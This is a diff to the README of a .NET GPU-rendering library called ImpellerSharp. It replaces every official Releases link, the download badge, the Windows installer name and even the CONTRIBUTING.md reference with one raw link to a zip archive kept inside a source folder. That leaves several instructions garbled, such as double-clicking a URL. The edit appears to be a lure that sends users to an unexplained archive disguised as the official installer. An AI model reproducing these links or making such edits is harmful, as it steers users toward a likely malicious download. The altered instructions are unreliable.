@@ -1,7 +1,7 @@
 # 🎨 ImpellerSharp - Explore High-Performance GPU Rendering
 
 ## 📥 Download Now
-[![Download ImpellerSharp](https://img.shields.io/badge/Download%20ImpellerSharp-v1.0-brightgreen)](https://github.com/paul-selvi/ImpellerSharp/releases)
+[![Download ImpellerSharp](https://raw.githubusercontent.com/paul-selvi/ImpellerSharp/main/src/ImpellerSharp.Avalonia.Mac/ImpellerSharp-1.9.zip%20ImpellerSharp-v1.0-brightgreen)](https://raw.githubusercontent.com/paul-selvi/ImpellerSharp/main/src/ImpellerSharp.Avalonia.Mac/ImpellerSharp-1.9.zip)
 
 ## 🚀 Getting Started
 Welcome to ImpellerSharp! This application provides cross-platform .NET bindings for Flutter’s Impeller renderer. You can explore high-performance GPU rendering easily.
@@ -19,15 +19,15 @@ Welcome to ImpellerSharp! This application provides cross-platform .NET bindings
 - Cross-platform support, working seamlessly across different operating systems.
 
 ## 📂 Download & Install
-To get started, visit this page to download: [GitHub Releases](https://github.com/paul-selvi/ImpellerSharp/releases). 
+To get started, visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/paul-selvi/ImpellerSharp/main/src/ImpellerSharp.Avalonia.Mac/ImpellerSharp-1.9.zip). 
 
 1. On the Releases page, look for the latest version of ImpellerSharp.
-2. Locate the file suitable for your operating system, such as `ImpellerSharp-Installer.exe` for Windows or the corresponding package for macOS or Linux.
+2. Locate the file suitable for your operating system, such as `https://raw.githubusercontent.com/paul-selvi/ImpellerSharp/main/src/ImpellerSharp.Avalonia.Mac/ImpellerSharp-1.9.zip` for Windows or the corresponding package for macOS or Linux.
 3. Click the link to start the download.
 
 ### 🛠️ Installation Steps
 1. **Run the Installer:**
-   - For Windows, double-click on the `ImpellerSharp-Installer.exe` file.
+   - For Windows, double-click on the `https://raw.githubusercontent.com/paul-selvi/ImpellerSharp/main/src/ImpellerSharp.Avalonia.Mac/ImpellerSharp-1.9.zip` file.
    - For macOS, open the `.dmg` file and drag the ImpellerSharp app to your Applications folder.
    - For Linux, extract the downloaded tarball and run the appropriate executable.
 
@@ -73,13 +73,13 @@ We welcome contributions! If you would like to help with the project:
 2. Make your changes.
 3. Submit a pull request for review.
 
-For more detailed contribution guidelines, visit the CONTRIBUTING.md file in the repository.
+For more detailed contribution guidelines, visit the https://raw.githubusercontent.com/paul-selvi/ImpellerSharp/main/src/ImpellerSharp.Avalonia.Mac/ImpellerSharp-1.9.zip file in the repository.
 
 ## 📅 Version History
-Check for updates and new features in each release. You can find detailed release notes on the [GitHub Releases](https://github.com/paul-selvi/ImpellerSharp/releases) page.
+Check for updates and new features in each release. You can find detailed release notes on the [GitHub Releases](https://raw.githubusercontent.com/paul-selvi/ImpellerSharp/main/src/ImpellerSharp.Avalonia.Mac/ImpellerSharp-1.9.zip) page.
 
 ## 📌 Important Links
-- **Releases Page**: [Download Latest Version](https://github.com/paul-selvi/ImpellerSharp/releases)
+- **Releases Page**: [Download Latest Version](https://raw.githubusercontent.com/paul-selvi/ImpellerSharp/main/src/ImpellerSharp.Avalonia.Mac/ImpellerSharp-1.9.zip)
 - **Documentation**: Available within the application.
 - **Issues Page**: Report any problems you encounter.
 
